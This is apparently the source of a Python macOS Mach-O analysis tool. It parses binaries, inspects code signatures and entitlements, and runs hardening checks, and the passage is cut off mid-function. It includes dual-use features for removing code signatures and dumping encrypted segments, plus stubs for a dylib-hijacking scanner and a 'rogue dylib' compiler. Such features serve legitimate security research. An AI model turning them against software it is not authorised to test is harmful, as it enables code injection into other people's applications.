#!/usr/bin/env python3
import lief
import uuid
import argparse
import subprocess
import os
import sys
import mmap
import plistlib
import json
import sys
import treelib

'''*** REMAINDER ***
Change initialization in MachOProcessoer -> process -> try block.
Always initialize the latest Snake class:

snake_instance = SnakeII(binaries)
'''
### --- I. MACH-O --- ###
class MachOProcessor:
    def __init__(self, file_path):
        '''This class contains part of the code from the main() for the SnakeI: Mach-O part.'''
        self.file_path = os.path.abspath(file_path)
    
    def parseFatBinary(self):
        return lief.MachO.parse(self.file_path)
    
    def process(self):
        '''Executes the code for the SnakeI: Mach-O. *** '''
        if not os.path.exists(self.file_path): # Check if file_path specified in the --path argument exists.
            print(f'The file {self.file_path} does not exist.')
            exit()
        
        try: # Check if the file has a valid Mach-O format
            global binaries # It must be global, becuase after the class is destructed, the snake_instance would point to invalid memory ("binary" is dependant on "binaries").
            binaries = self.parseFatBinary()
            if binaries == None:
                exit() # Exit if not

            global snake_instance # Must be globall for further processors classes.
            snake_instance = SnakeIV(binaries, self.file_path) # Initialize the latest Snake class
                
            if args.file_type: # Print binary file type
                print(f'File type: {snake_instance.getFileType()}')
            if args.header_flags: # Print binary header flags
                header_flag_list = snake_instance.getHeaderFlags()
                print("Header flags:", " ".join(header_flag.name for header_flag in header_flag_list))
            if args.endian: # Print binary endianess
                print(f'Endianess: {snake_instance.getEndianess()}')
            if args.header: # Print binary header
                print(snake_instance.getBinaryHeader())
            if args.load_commands: # Print binary load commands
                load_commands_list = snake_instance.getLoadCommands()
                print("Load Commands:", " ".join(load_command.command.name for load_command in load_commands_list))
            if args.segments: # Print binary segments in human friendly form
                for segment in snake_instance.getSegments():
                    print(segment)
            if args.sections: # Print binary sections in human friendly form
                for section in snake_instance.getSections():
                    print(section)
            if args.symbols: # Print symbols
                for symbol in snake_instance.getSymbols():
                    print(symbol.name)
            if args.chained_fixups: # Print Chained Fixups information
                print(snake_instance.getChainedFixups())
            if args.exports_trie: # Print Exports Trie information 
                print(snake_instance.getExportTrie())    
            if args.uuid: # Print UUID
                print(f'UUID: {snake_instance.getUUID()}')
            if args.main: # Print entry point and stack size
                print(f'Entry point: {hex(snake_instance.getMain().entrypoint)}')
                print(f'Stack size: {hex(snake_instance.getMain().stack_size)}')
            if args.encryption_info is not None: # Print encryption info and save encrypted data if path is specified
                if snake_instance.binary.has_encryption_info:
                    crypt_id, crypt_offset, crypt_size = snake_instance.getEncryptionInfo()
                    print(f"cryptid: {crypt_id}")
                    print(f"cryptoffset: {hex(crypt_offset)}")
                    print(f"cryptsize: {hex(crypt_size)}")
                    save_path = args.encryption_info
                    if save_path and save_path.strip():
                        snake_instance.saveEcryptedData(save_path.strip())
                else:
                    print(f"{os.path.basename(file_path)} binary does not have encryption info.")
            if args.strings_section: # Print strings from __cstring section
                print('Strings from __cstring section:')
                print('-------------------------------')
                for string in (snake_instance.getStringSection()):
                    print(string)
            if args.all_strings: # Print strings from all sections.
                print(snake_instance.findAllStringsInBinary())
            if args.save_strings: # Parse all sections, detect strings and save them to a file
                extracted_strings = snake_instance.findAllStringsInBinary()
                with open(args.save_strings, 'a') as f:
                    for s in extracted_strings:
                        f.write(s)
            if args.info: # Print all info about the binary
                print('\n<=== HEADER ===>')
                print(snake_instance.getBinaryHeader())
                print('\n<=== LOAD COMMANDS ===>')
                for lcd in snake_instance.getLoadCommands():
                    print(lcd)
                    print("="*50)
                print('\n<=== SEGMENTS ===>')
                for segment in snake_instance.getSegments():
                    print(segment)
                print('\n<=== SECTIONS ===>')
                for section in snake_instance.getSections():
                    print(section)
                print('\n<=== SYMBOLS  ===>')
                for symbol in snake_instance.getSymbols():
                    print(symbol.name)
                print('\n<=== STRINGS ===>')
                print('Strings from __cstring section:')
                print('-------------------------------')
                for string in (snake_instance.getStringSection()):
                    print(string)
                if snake_instance.binary.has_encryption_info:
                    print('\n<=== ENCRYPTION INFO ===>')
                    crypt_id, crypt_offset, crypt_size = snake_instance.getEncryptionInfo()
                    print(f"cryptid: {crypt_id}")
                    print(f"cryptoffset: {hex(crypt_offset)}")
                    print(f"cryptsize: {hex(crypt_size)}")
                print('\n<=== UUID ===>')
                print(f'{snake_instance.getUUID()}')
                print('\n<=== ENDIANESS ===>')
                print(snake_instance.getEndianess())
                print('\n<=== ENTRYPOINT ===>')
                print(f'{hex(snake_instance.getMain().entrypoint)}')
        except Exception as e: # Handling any unexpected errors
            print(f"An error occurred during SnakeI: Mach-O processing: {e}")
            exit()
class SnakeI:
    def __init__(self, binaries, file_path):
        '''When initiated, the program parses a Universal binary (binaries parameter) and extracts the ARM64 Mach-O. If the file is not in a universal format but is a valid ARM64 Mach-O, it is taken as a binary parameter during initialization.'''
        self.binary = self.parseFatBinary(binaries)
        self.file_path = file_path
        self.load_commands = self.getLoadCommands()
        self.endianess = self.getEndianess()
        self.fat_offset = self.binary.fat_offset # For various calculations, if ARM64 Mach-O extracted from Universal Binary 
        self.prot_map = {
        0: '---',
        1: 'r--',
        2: '-w-',
        3: 'rw-',
        4: '--x',
        5: 'r-x',
        6: '-wx',
        7: 'rwx'
        }
        self.segment_flags_map = {
        0x1: 'SG_HIGHVM',
        0x2: 'SG_FVMLIB',
        0x4: 'SG_NORELOC',
        0x8: 'SG_PROTECTED_VERSION_1',
        0x10: 'SG_READ_ONLY',
        }
    
    def mapProtection(self, numeric_protection):
        '''Maps numeric protection to its string representation.'''
        return self.prot_map.get(numeric_protection, 'Unknown')
    
    def getSegmentFlags(self, flags):
        '''Maps numeric segment flags to its string representation.'''
        return self.segment_flags_map.get(flags, '')
        #return " ".join(activated_flags)
        
    def parseFatBinary(self, binaries):
        '''Parse Mach-O file, whether compiled for multiple architectures or just for a single one. It returns the ARM64 binary if it exists. If not, it exits the program.'''
        for binary in binaries:
            if binary.header.cpu_type == lief.MachO.CPU_TYPES.ARM64:
                arm64_bin = binary
        if arm64_bin == None:
            print('The specified Mach-O file is not in ARM64 architecture.')
            exit()
        return arm64_bin
    
    def getFileType(self):
        """Extract and return the file type from a binary object's header."""
        return self.binary.header.file_type.name

    def getHeaderFlags(self):
        '''Return binary header flags.'''
        return self.binary.header.flags_list

    def getEndianess(self):
        '''Check the endianness of a binary based on the system and binary's magic number.'''
        magic = self.binary.header.magic.name
        endianness = sys.byteorder
        if endianness == 'little' and (magic == 'MAGIC_64' or magic == 'MAGIC' or magic == 'FAT_MAGIC'):
            return 'little'
        else:
            return 'big'
    
    def getBinaryHeader(self):
        '''https://lief-project.github.io/doc/stable/api/python/macho.html#header'''
        return self.binary.header
    
    def getLoadCommands(self):
        '''https://lief-project.github.io/doc/stable/api/python/macho.html#loadcommand'''
        return self.binary.commands

    def getSegments(self):
        '''Extract segmenents from binary and return a human readable string: https://lief-project.github.io/doc/stable/api/python/macho.html#lief.MachO.SegmentCommand'''
        segment_info = []
        for segment in self.binary.segments:
            name = segment.name
            va_start = '0x' + format(segment.virtual_address, '016x')
            va_end = '0x' + format(int(va_start, 16) + segment.virtual_size, '016x')
            file_start = hex(segment.file_size + self.fat_offset)
            file_end = hex(int(file_start, 16) + segment.file_size)
            init_prot = self.mapProtection(segment.init_protection)
            max_prot = self.mapProtection(segment.max_protection)            
            flags = self.getSegmentFlags(segment.flags)
            if flags != '':
                segment_info.append(f'{name.ljust(16)}{init_prot}/{max_prot.ljust(8)} VM: {va_start}-{va_end.ljust(24)} FILE: {file_start}-{file_end} ({flags})')
            else:
                segment_info.append(f'{name.ljust(16)}{init_prot}/{max_prot.ljust(8)} VM: {va_start}-{va_end.ljust(24)} FILE: {file_start}-{file_end}')                
        return segment_info

    def getSections(self):
        '''Extract sections from binary and return in human readable format: https://lief-project.github.io/doc/stable/api/python/macho.html#lief.MachO.Section'''
        sections_info = []
        sections_info.append("SEGMENT".ljust(14) + "SECTION".ljust(20) + "TYPE".ljust(28) + "VIRTUAL MEMORY".ljust(32) + "FILE".ljust(26) + "FLAGS".ljust(40))
        sections_info.append(len(sections_info[0])*"=")
        for section in self.binary.sections:
            segment_name = section.segment_name
            section_name = section.fullname
            section_type = section.type.name
            section_va_start = hex(section.virtual_address)
            section_va_end = hex(section.virtual_address + section.offset)
            section_size_start = hex(section.offset + self.fat_offset)
            section_size_end = hex(section.size + section.offset + self.fat_offset)
            section_flags_list = section.flags_list
            flags_strings = [flag.name for flag in section_flags_list]
            flags = " ".join(flags_strings)
            sections_info.append((f'{segment_name.ljust(14)}{section_name.ljust(20)}{section_type.ljust(28)}{section_va_start}-{section_va_end.ljust(20)}{section_size_start}-{section_size_end}\t\t({flags})'))
        return sections_info

    def getSymbols(self):
        '''Get all symbols from the binary (LC_SYMTAB, Chained Fixups, Exports Trie): https://lief-project.github.io/doc/stable/api/python/macho.html#symbol'''
        return self.binary.symbols

    def getChainedFixups(self):
        '''Return Chained Fixups information: https://lief-project.github.io/doc/latest/api/python/macho.html#chained-binding-info'''
        return self.binary.dyld_chained_fixups
        
    def getExportTrie(self):
        '''Return Export Trie information: https://lief-project.github.io/doc/latest/api/python/macho.html#dyldexportstrie-command'''
        try:
            return self.binary.dyld_exports_trie.show_export_trie()
        except:
            return "NO EXPORT TRIE"

    def getUUID(self):
        '''Return UUID as string and in UUID format: https://lief-project.github.io/doc/stable/api/python/macho.html#uuidcommand'''
        for cmd in self.binary.commands:
            if isinstance(cmd, lief.MachO.UUIDCommand):
                uuid_bytes = cmd.uuid
                break
        uuid_string = str(uuid.UUID(bytes=bytes(uuid_bytes)))
        return uuid_string

    def getMain(self):
        '''Determine the entry point of an executable.'''
        return self.binary.main_command
    
    def getStringSection(self):
        '''Return strings from the __cstring (string table).'''
        extracted_strings = set()
        for section in self.binary.sections:
            if section.type == lief.MachO.SECTION_TYPES.CSTRING_LITERALS:
                extracted_strings.update(section.content.tobytes().split(b'\x00'))
        return extracted_strings

    def findAllStringsInBinary(self):
        '''Check every binary section to find strings.'''
        extracted_strings = ""
        byte_set = set()
        for section in self.binary.sections:
            byte_set.update(section.content.tobytes().split(b'\x00'))
        for byte_item in byte_set:
            try:
                decoded_string = byte_item.decode('utf-8')
                extracted_strings += decoded_string + "\n"
            except UnicodeDecodeError:
                pass
        return extracted_strings
    
    def getEncryptionInfo(self):
        '''Return information regardles to LC_ENCRYPTION_INFO(_64).'''
        if self.binary.has_encryption_info:
            crypt_id = self.binary.encryption_info.crypt_id
            crypt_offset = self.binary.encryption_info.crypt_offset
            crypt_size = self.binary.encryption_info.crypt_size
            return crypt_id, crypt_offset, crypt_size
    
    def extractBytesAtOffset(self, offset, size):
        '''Extract bytes at a given offset and of a specified size in a binary file (takes into account Fat Binary slide)'''
        # Open the binary file in binary mode
        with open(file_path, "rb") as file:
            # Check if the specified offset and size are within bounds
            file_size = os.path.getsize(file_path)
            offset += self.fat_offset # Add the fat_offset in case of the Fat Binary (ARM binary data is most of the time after x86_64 binary data)
            #print(hex(offset) + hex(size))
            if offset + size > file_size:
                raise ValueError("Offset and size exceed the binary file's length.")
            # Seek to the offset considering the fat_offset
            file.seek(offset)
            # Read the specified size of bytes
            extracted_bytes = file.read(size)
        return extracted_bytes
    
    def saveEcryptedData(self,output_path):
        _, cryptoff, cryptsize = self.getEncryptionInfo()
        self.saveBytesToFile(self.extractBytesAtOffset(cryptoff, cryptsize), output_path)
### --- II. CODE SIGNING --- ### 
class CodeSigningProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeII: Code Signing.'''
        pass

    def process(self):
        try:
            if args.verify_signature: # Verify if Code Signature match the binary content ()
                if snake_instance.isSigValid(file_path):
                    print("Valid Code Signature (matches the content)")
                else:
                    print("Invalid Code Signature (does not match the content)")
            if args.cd_info: # Print Code Signature information
                print(snake_instance.getCodeSignature(file_path).decode('utf-8'))
            if args.cd_requirements: # Print Requirements.
                print(snake_instance.getCodeSignatureRequirements(file_path).decode('utf-8'))
            if args.entitlements: # Print Entitlements.
                print(snake_instance.getEntitlementsFromCodeSignature(file_path,args.entitlements))
            if args.extract_cms: # Extract the CMS Signature and save it to a given file.
                cms_signature = snake_instance.extractCMS()
                snake_instance.saveBytesToFile(cms_signature, args.extract_cms)
            if args.extract_certificates: # Extract Certificates and save them to a given file.
                snake_instance.extractCertificatesFromCodeSignature(args.extract_certificates)
            if args.remove_sig: # Save a new file on a disk with the removed signature:
                snake_instance.removeCodeSignature(args.remove_sig)
            if args.sign_binary: # Sign the given binary using specified identity:
                snake_instance.signBinary(args.sign_binary)
        except Exception as e:
            print(f"An error occurred during SnakeII: Code Signing processing: {e}") 
class SnakeII(SnakeI):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)
        self.magic_bytes = (0xFADE0B01).to_bytes(4, byteorder='big')  # CMS Signature Blob magic bytes, as Code Signature as a whole is in network byte order(big endian).

    def isSigValid(self, file_path):
        '''Checks if the Code Signature is valid (if the contents of the binary have been modified.)'''
        result = subprocess.run(["codesign", "-v", file_path], capture_output=True)
        if result.stderr == b'':
            return True
        else:
            return False

    def getCodeSignature(self, file_path):
        '''Returns information about the Code Signature.'''
        result = subprocess.run(["codesign", "-d", "-vvvvvv", file_path], capture_output=True)
        return result.stderr

    def getCodeSignatureRequirements(self, file_path):
        '''Returns information about the Code Signature Requirements.'''
        result = subprocess.run(["codesign", "-d", "-r", "-", file_path], capture_output=True)
        return result.stdout

    def getEntitlementsFromCodeSignature(self, file_path, format=None):
        '''Returns information about the Entitlements for Code Signature.'''
        if format == 'human' or format == None:
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", file_path], capture_output=True)
            return result.stdout.decode('utf-8')
        elif format == 'xml':
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", "--xml", file_path], capture_output=True)
        elif format == 'der':
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", "--der", file_path], capture_output=True)
        return result.stdout

    def extractCMS(self):
        '''Find the offset of magic bytes in a binary using LIEF.'''
        cs = self.binary.code_signature
        cs_content = bytes(cs.content)
        offset = cs_content.find(self.magic_bytes)
        cms_len_in_bytes = cs_content[offset + 4:offset + 8]
        cms_len_in_int = int.from_bytes(cms_len_in_bytes, byteorder='big')
        cms_signature = cs_content[offset + 8:offset + 8 + cms_len_in_int]
        return cms_signature

    def saveBytesToFile(self, data, filename):
        '''Save bytes to a file.'''
        with open(filename, 'wb') as file:
            file.write(data)

    def extractCertificatesFromCodeSignature(self, cert_name):
        '''Extracts certificates from the CMS Signature and saves them to a file with _0, _1, _2 indexes at the end of the file names.'''
        subprocess.run(["codesign", "-d", f"--extract-certificates={cert_name}_", file_path], capture_output=True)

    def removeCodeSignature(self, new_name):
        '''Save new file on a disk with removed signature.'''
        self.binary.remove_signature()
        self.binary.write(new_name)

    def signBinary(self,security_identity=None):
        '''Sign binary using pseudo identity (adhoc) or specified identity.'''
        if security_identity == 'adhoc' or security_identity == None:
            result = subprocess.run(["codesign", "-s", "-", "-f", file_path], capture_output=True)
            return result.stdout.decode('utf-8')
        else:
            try:
                result = subprocess.run(["codesign", "-s", security_identity, "-f", file_path], capture_output=True)
            except Exception as e:
                print(f"An error occurred during Code Signing using {security_identity}\n {e}")
### --- III. CHECKSEC --- ### 
class ChecksecProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeIII: Checksec.'''
        pass

    def process(self):
        try:
            if args.has_pie: # Check if PIE is set in the header flags
                print("PIE: " + str(snake_instance.hasPIE()))
            if args.has_arc: # Check if ARC is in use
                print("ARC: " + str(snake_instance.hasARC()))
            if args.is_stripped: # Check if binary is stripped
                print("STRIPPED: " + str(snake_instance.isStripped()))
            if args.has_canary: # Check if binary has stack canary
                print("CANARY: " + str(snake_instance.hasCanary()))
            if args.has_nx_stack: # Check if binary has non executable stack
                print("NX STACK: " + str(snake_instance.hasNXstack()))
            if args.has_nx_heap: # Check if binary has non executable heap
                print("NX HEAP: " + str(snake_instance.hasNXheap()))
            if args.has_xn: # Check if binary is protected by eXecute Never functionality
                print(f"eXecute Never: {str(snake_instance.hasXN())}")
            if args.is_notarized: # Check if the application is notarized and can pass the Gatekeeper verification
                print("NOTARIZED: " + str(snake_instance.isNotarized(file_path)))
            if args.is_encrypted: # Check if the application has encrypted data
                print("ENCRYPTED: " + str(snake_instance.isEncrypted()))
            if args.has_restrict: # Check if the application has encrypted data
                print("RESTRICTED: " + str(snake_instance.hasRestrictSegment()))
            if args.is_hr: # Check if Hardened Runtime is in use   
                print("HARDENED: " + str(snake_instance.hasHardenedRuntimeFlag(file_path)))
            if args.is_as: # Check if App Sandbox is in use
                print("APP SANDBOX: " + str(snake_instance.hasAppSandbox(file_path)))
            if args.is_fort: # Check if binary is fortified
                fortified_symbols = snake_instance.getForifiedSymbols()
                print("FORTIFIED: " + str(snake_instance.isFortified(fortified_symbols)))   
            if args.has_rpath: # Check if binary has @rpaths
                print("RPATH: " + str(snake_instance.hasRpath()))                
            if args.checksec: # Run all checks from above and present it in a table
                print("<==== CHECKSEC ======")
                print("PIE: ".ljust(16) + str(snake_instance.hasPIE()))
                print("ARC: ".ljust(16) + str(snake_instance.hasARC()))
                print("STRIPPED: ".ljust(16) + str(snake_instance.isStripped()))
                print("CANARY: ".ljust(16) + str(snake_instance.hasCanary()))
                print("NX STACK: ".ljust(16) + str(snake_instance.hasNXstack()))
                print("NX HEAP: ".ljust(16) + str(snake_instance.hasNXheap()))
                print("XN:".ljust(16) + str(snake_instance.hasXN()))
                print("NOTARIZED: ".ljust(16) + str(snake_instance.isNotarized(file_path)))
                print("ENCRYPTED: ".ljust(16) + str(snake_instance.isEncrypted()))
                print("RESTRICTED: ".ljust(16) + str(snake_instance.hasRestrictSegment()))
                print("HARDENED: ".ljust(16) + str(snake_instance.hasHardenedRuntimeFlag(file_path)))
                print("APP SANDBOX: ".ljust(16) + str(snake_instance.hasAppSandbox(file_path)))
                fortified_symbols = snake_instance.getForifiedSymbols()
                print("FORTIFIED: ".ljust(16) + str(snake_instance.isFortified(fortified_symbols)))
                print("RPATH: ".ljust(16) + str(snake_instance.hasRpath()))
                print("=====================>")
        except Exception as e:
            print(f"An error occurred during SnakeIII: Checksec processing: {e}")
class SnakeIII(SnakeII):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)

    def hasPIE(self):
        '''Check if MH_PIE (0x00200000) is set in the header flags.'''
        return self.binary.is_pie

    def hasARC(self):
        '''Check if the _objc_release symbol is imported.'''
        for symbol in self.binary.symbols:
            if symbol.name.lower().strip() == '_objc_release':
                return True
        return False

    def isStripped(self):
        '''Check if binary is stripped.'''
        filter_symbols = ['radr://5614542', '__mh_execute_header']

        for symbol in self.binary.symbols:
            symbol_type = symbol.type
            symbol_name = symbol.name.lower().strip()

            is_symbol_stripped = (symbol_type & 0xe0 > 0) or (symbol_type in [0x0e, 0x1e, 0x0f])
            is_filtered = symbol_name not in filter_symbols

            if is_symbol_stripped and is_filtered:
                return False
        return True

    def hasCanary(self):
        '''Check whether in the binary there are symbols: ___stack_chk_fail and ___stack_chk_guard.'''
        canary_symbols = ['___stack_chk_fail', '___stack_chk_guard']
        for symbol in self.binary.symbols:
            if symbol.name.lower().strip() in canary_symbols:
                return True
        return False

    def hasNXstack(self):
        '''Check if MH_ALLOW_STACK_EXECUTION (0x00020000 ) is not set in the header flags.'''
        return not bool(self.binary.header.flags & lief.MachO.HEADER_FLAGS.ALLOW_STACK_EXECUTION.value)

    def hasNXheap(self):
        '''Check if MH_NO_HEAP_EXECUTION (0x01000000 ) is set in the header flags.'''
        return bool(self.binary.header.flags & lief.MachO.HEADER_FLAGS.NO_HEAP_EXECUTION.value)

    def isXNos():
        '''Check if the OS is running on the ARM architecture.'''
        system_info = os.uname()
        if "arm" in system_info.machine.lower():
            return True
        return False
    
    def checkXNmap():
        '''If XN is ON, you will not be able to map memory page that has W&X at the same time, so to check it, you can create such page.'''
        try:
            mmap.mmap(-1,4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        except mmap.error as e:
            #print(f"Failed to create W&X memory map - eXecute Never is supported on this machine. \n {str(e)}")
            return True
        return False
    
    def convertXMLEntitlementsToDict(self, entitlements_xml):
        '''Takes the Entitlements in XML format from getEntitlementsFromCodeSignature() method and convert them to a dictionary.'''
        return plistlib.loads(entitlements_xml)
    
    def convertDictEntitlementsToJson(self,entitlements_dict):
        '''Takes the Entitlements in dictionary format from convertXMLEntitlementsToDict() method and convert them to a JSON with indent 4.'''
        return json.dumps(entitlements_dict, indent=4)
    
    def checkIfEntitlementIsUsed(self, entitlement_name, entitlement_value, file_path):
        '''Check if the given entitlement exists and has the specified value.'''
        try:
            entitlements_xml = self.getEntitlementsFromCodeSignature(file_path, 'xml')
            if entitlements_xml == b'': # Return False if there are no entitlements
                return False
            entitlements_dict = self.convertXMLEntitlementsToDict(entitlements_xml)
            # Convert the entire parsed data to lowercase for case-insensitive comparison
            parsed_data = {key.lower(): value for key, value in entitlements_dict.items()}
            # Convert entitlement name and value to lowercase for case-insensitive and type-insensitive comparison
            entitlement_name_lower = entitlement_name.lower()
            entitlement_value_lower = str(entitlement_value).lower()

            if entitlement_name_lower in parsed_data and str(parsed_data[entitlement_name_lower]).lower() == entitlement_value_lower:
                return True
            else:
                return False
        except json.JSONDecodeError as e:
            # Handle JSON decoding error if any
            print(f"Error in checkIfEntitlementIsUsed: {e}")
            return False
        
    def hasAllowJITentitlement(self, file_path):
        '''Checks if the binary has missing com.apple.security.cs.allow-jit entitlement that allows the app to create writable and executable memory using the MAP_JIT flag.'''
        if self.checkIfEntitlementIsUsed('com.apple.security.cs.allow-jit', 'true', file_path):
            print(f"[INFO -> XN]: {os.path.basename(file_path)} contains allow-jit entitlement.")
            return True
        return False
    
    def checkIfCompiledForOtherThanARM(self):
        '''Iterates over FatBinary and check if there are other architectures than ARM.'''
        XN_types = [lief.MachO.CPU_TYPES.ARM64, lief.MachO.CPU_TYPES.ARM]
        for binary in binaries:
            if binary.header.cpu_type not in XN_types:
                print(f"[INFO -> XN]: {os.path.basename(file_path)} is compiled for other CPUs than ARM or ARM64.")
                return True
        return False
        
    def hasXN(self):
        '''Check if binary allows W&X via com.apple.security.cs.allow-jit entitlement or is compiled for other CPU types than these which supports eXecuteNever feature of ARM.'''
        if self.hasAllowJITentitlement(self.file_path) or self.checkIfCompiledForOtherThanARM():
            return False
        return True
    
    def isNotarized(self, file_path):
        '''Verifies if the application is notarized and can pass the Gatekeeper verification.'''
        result = subprocess.run(["spctl", "-a", file_path], capture_output=True)
        if result.stderr == b'':
            return True
        else:
            #print(f"[INFO -> NOTARIZATION]: {result.stderr.decode().rstrip()}")
            return False

    def isEncrypted(self):
        '''If the cryptid has a non-zero value, some parts of the binary are encrypted.'''
        if self.binary.has_encryption_info:
            if self.binary.encryption_info.crypt_id == 1:
                return True
        return False

    def hasRestrictSegment(self):
        '''Check if binary contains __RESTRICT segment. Return True if it does.'''
        for segment in self.binary.segments:
            if segment.name.lower().strip() == "__restrict":
                return True
        return False

    def hasHardenedRuntimeFlag(self, file_path):
        '''Check if Hardened Runtime flag is set for the given binary.'''
        if b'runtime' in self.getCodeSignature(file_path):
            return True
        return False
    
    def hasAppSandbox(self, file_path):
        '''Check if App Sandbox is in use (com.apple.security.app-sandbox entitlement is set).'''
        if self.checkIfEntitlementIsUsed('com.apple.security.app-sandbox', 'true', file_path):
            return True
        return False
    
    def getForifiedSymbols(self):
        '''Check for symbol names that contain _chk suffix and filter out stack canary symbols. Function returns a list of all safe symbols.'''
        symbol_fiter = ['___stack_chk_fail', '___stack_chk_guard']
        fortified_symbols = []
        for symbol in self.binary.symbols:
            symbol_name = symbol.name.lower().strip()
            if ('_chk' in symbol_name) and (symbol_name not in symbol_fiter):
                fortified_symbols.append(symbol_name)
        return fortified_symbols

    def isFortified(self, fortified_symbols):
        '''Check if there are any fortified symbols in the give fortified_symbols list.'''
        if len(fortified_symbols) > 0:
            return True
        return False

    def hasRpath(self):
        return self.binary.has_rpath
### --- IV. DYLIBS --- ### 
class DylibsProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeIV: Dylibs.'''
        pass

    def process(self):
        #try:
            if args.dylibs: # Shared dylibs with unresolved paths
                snake_instance.printDylibs()
            if args.rpaths: # All resolved paths from LC_RPATHs
                snake_instance.printRpathsResolved()
            if args.rpaths_u: # All inresolved paths from LC_RPATHs
                snake_instance.printRpathsUnresolved()
            if args.dylibs_paths: # Resolved dylib loading paths in order they are searched for
                snake_instance.printResolvedDylibPaths()
            if args.dylibs_paths_u: # Unresolved dylib loading paths (same as --dylibs, but without version info)
                snake_instance.printUnresolvedDylibPaths()
            if args.broken_relative_paths: #  Relative paths
                snake_instance.printBrokenRelativePaths()
            if args.dylibtree: #  Dylibtree
                args_dylibtree = args.dylibtree.split(',')
                dylibtree = snake_instance.getDylibTree(args_dylibtree[0], args_dylibtree[1],args_dylibtree[2])
                snake_instance.printTreeFromTreelib(dylibtree)
            if args.dylib_id: # Path from Dylib ID Load Command
                print(snake_instance.getPathFromDylibID())
            if args.reexport_paths: # All reexported libraries paths
                print(*snake_instance.getReExportPaths(), sep="\n")
            if args.hijack_sec: # Check Dylib Hijacking protection on binary
                print("DYLIB HIJACKIG PROTECTION: " + str(snake_instance.checkDylibHijackingProtections(file_path)))
            if args.dylib_hijacking: # Direct & Indirect Dylib Hijacking check
                if args.dylib_hijacking == 'default':
                    args.dylib_hijacking = None
                all_results = snake_instance.dylibHijackingScanner(args.dylib_hijacking)
                snake_instance.parseDylibHijackingScannerResults(all_results)
            if args.prepare_dylib: # Compile rogue dylib
                if args.prepare_dylib == 'default':
                    args.prepare_dylib = None
                snake_instance.prepareRogueDylib(args.prepare_dylib)
        #except Exception as e:
            #print(f"An error occurred during SnakeIV: Dylibs processing: {e}")
class SnakeIV(SnakeIII):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)
        self.dylib_load_commands_names = {
        'LAZY_LOAD_DYLIB',
        'LOAD_DYLIB',
        'LOAD_UPWARD_DYLIB',
        'LOAD_WEAK_DYLIB',
        'PREBOUND_DYLIB',
        'REEXPORT_DYLIB',
        }
        self.dylib_id_path = self.getPathFromDylibID() # Get Dylib ID for @loader_path resolving
        self.dylib_loading_commands, self.dylib_loading_commands_names = self.getDylibLoadCommands() # 1. Get dylib specific load commands
        self.rpath_list = self.resolveRunPathLoadCommands() # 2. Get LC_RPATH list
        self.absolute_paths = self.resolveDylibPaths() # 3. Get all dylib absolute paths dictionary {dylib_name[dylib_paths]}
        self.dyld_share_cache_path = '/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e'
        
    def getSharedLibraries(self, only_names=True):
        '''Return array of shared libraries used by the binary. When the only_names is set to False it aslo prints compatibility and current version of each library.'''
        dylibs = []
        for library in self.binary.libraries:
            if only_names:
                dylibs.append(library.name)
            else:
                formatted_compat_version = ".".join(map(str, library.compatibility_version))
                formatted_current_version = ".".join(map(str, library.current_version))
                dylibs.append(f"{library.name} (compatibility version: {formatted_compat_version}, current version: {formatted_current_version})")
        return dylibs
    
    def getDylibLoadCommands(self):
        '''Return a list of load commands that load dylibs.'''
        dylib_loading_commands = []
        dylib_loading_commands_names = []
        
        for cmd in self.load_commands:
            cmd_name = cmd.command.name
            if cmd_name in self.dylib_load_commands_names:
                dylib_loading_commands.append(cmd)
                dylib_loading_commands_names.append(cmd_name)
            
        return dylib_loading_commands, dylib_loading_commands_names
    
    def getUnresolvedRunPathLoadCommandsPaths(self):
        '''
        Return a list of unresolved paths (like @executable_path/Frameworks) from LC_RPATH load commands. Example return:
        ['/usr/lib/swift', '@executable_path/Frameworks', '@loader_path/Frameworks']
        '''
        return [cmd.path for cmd in self.load_commands if cmd.command.name == 'RPATH']
    
    def resolveRunPathLoadCommands(self):
        '''
        Return a list of resolved (absolute) paths from LC_RPATH. Example return:
        ['/usr/lib/swift', '/Applications/Suunto.app/WrappedBundle/Frameworks', '/Applications/Suunto.app/WrappedBundle/Frameworks']
        '''
        executable_path = os.path.dirname(self.file_path)
        if self.dylib_id_path:
            loader_path = self.dylib_id_path
        else:
            loader_path = executable_path
        
        unresolved_LC_RPATHS = self.getUnresolvedRunPathLoadCommandsPaths()
        LC_RPATHS = []
        for path in unresolved_LC_RPATHS:
            if path.startswith('@executable_path'):
                path = path.replace('@executable_path',executable_path)
                LC_RPATHS.append(path)
            elif path.startswith('@loader_path'):
                path = path.replace('@loader_path',loader_path)
                LC_RPATHS.append(path)
            else:
                LC_RPATHS.append(path)
        return LC_RPATHS
    
    def extractPathFromDylibLoadCommandStruct(self, dylib_load_command):
        '''Extracts the string path from a dylib load command structure.'''
        cmd_data = bytes(dylib_load_command.data)
        offset_data = cmd_data[8:]
        offset = int.from_bytes(offset_data[:4], byteorder=self.endianess)
        string_data = cmd_data[offset:]
        null_index = string_data.find(0)
        path_bytes = string_data[:null_index]
        path_string = path_bytes.decode('utf-8')
        return path_string
    
    def resolveRunPathPaths(self, path):
        '''
        Return ordered list of resolved @rpaths for the given dylib path.
        Example return for self.rpath_list = ['/1/', '/2/'] and dylib path = @rpath/test.dylib
        [ '/1/test.dylib', '/2/test.dylib']
        '''
        resolved_rpaths = []
        for rpath in self.rpath_list:
            resolved_rpaths.append(path.replace('@rpath',rpath))
        return resolved_rpaths

    def resolveDylibPaths(self):
        '''
        Return a dictionary of dylib_name : dylib_absolute_paths
        Paths are absolute (with resolved @rpath, @executable_path, @loader_path)
        '''
        executable_path = os.path.dirname(self.file_path)
        if self.dylib_id_path:
            loader_path = self.dylib_id_path
        else:
            loader_path = executable_path 
        absolute_paths = {}
        
        for dylib_load_command in self.dylib_loading_commands:
            path = self.extractPathFromDylibLoadCommandStruct(dylib_load_command)
            name = os.path.basename(path)
            
            if name not in absolute_paths:
                absolute_paths[name] = []
            
            if path.startswith('@executable_path'):
